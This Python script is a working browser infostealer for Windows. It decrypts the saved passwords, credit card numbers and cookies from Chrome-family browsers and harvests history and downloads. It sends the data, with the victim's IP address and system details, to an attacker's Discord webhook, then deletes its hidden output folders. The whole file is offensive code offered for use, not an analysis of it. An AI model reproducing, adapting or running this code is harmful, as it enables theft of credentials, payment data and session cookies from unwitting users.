import base64
import json
import os
import shutil
import sqlite3
from datetime import datetime, timedelta
import requests
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import ctypes
import socket
import platform
import psutil

appdata = os.getenv('LOCALAPPDATA')

browsers = {
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}

def get_master_key(path: str):
    if not os.path.exists(path):
        return None

    with open(path + "\\Local State", 'r', encoding='utf-8') as f:
        c = f.read()
    if 'os_crypt' not in c:
        return None

    local_state = json.loads(c)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key

def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def hide_folder(path: str):
    FILE_ATTRIBUTE_HIDDEN = 0x02
    ctypes.windll.kernel32.SetFileAttributesW(path, FILE_ATTRIBUTE_HIDDEN)

def save_results(browser_name, type_of_data, content):
    if not os.path.exists(browser_name):
        os.mkdir(browser_name)
        hide_folder(browser_name)
    if content is not None:
        with open(f'{browser_name}/{type_of_data}.txt', 'w', encoding="utf-8") as file:
            file.write(content)
        print(f"\t [*] Saved in {browser_name}/{type_of_data}.txt")
        send_to_discord(content, audio_file=None)
    else:
        print(f"\t [-] No Data Found!")

def get_ip():
    try:
        public_ip = requests.get('https://api.ipify.org').text
    except requests.RequestException:
        public_ip = 'N/A'

    local_ip = socket.gethostbyname(socket.gethostname())
    return public_ip, local_ip

def get_system_info():
    system_info = {
        "System": platform.system(),
        "Node Name": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "CPU Cores": psutil.cpu_count(logical=True),
        "Total RAM (GB)": round(psutil.virtual_memory().total / (1024**3), 2)
    }
    return system_info

def send_to_discord(content, audio_file=None):
    public_ip, local_ip = get_ip()
    system_info = get_system_info()

    webhook_url = 'METTI IL TUO WEBBOH URL'
    data = {
        "content": (
            f"Public IP: {public_ip}\n"
            f"Local IP: {local_ip}\n\n"
            f"System Information:\n"
            f"System: {system_info['System']}\n"
            f"Node Name: {system_info['Node Name']}\n"
            f"Release: {system_info['Release']}\n"
            f"Version: {system_info['Version']}\n"
            f"Machine: {system_info['Machine']}\n"
            f"Processor: {system_info['Processor']}\n"
            f"CPU Cores: {system_info['CPU Cores']}\n"
            f"Total RAM (GB): {system_info['Total RAM (GB)']}\n\n"
            f"{content}"
        )
    }

    if audio_file:
        files = {'file': open(audio_file, 'rb')}
        requests.post(webhook_url, data=data, files=files)
    else:
        requests.post(webhook_url, json=data)

def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return None
    result = ""
    shutil.copy(db_file, 'temp_db')
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_password(row[i], key)
        if type_of_data['file'] == '\\History':
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove('temp_db')
    return result

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available

def delete_folder(path: str):
    """Elimina la cartella e il suo contenuto."""
    if os.path.exists(path):
        shutil.rmtree(path)
        print(f"Cartella {path} eliminata.")

if __name__ == '__main__':
    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        print(f"Getting Stored Details from {browser}")

        for data_type_name, data_type in data_queries.items():
            print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
            data = get_data(browser_path, "Default", master_key, data_type)
            save_results(browser, data_type_name, data)
            print("\t------\n")

    # Invia le informazioni di sistema e IP a Discord
    send_to_discord(content="System information and browser data attached.")

    # Elimina le cartelle con i file .txt
    for browser in browsers.keys():
        delete_folder(browser)
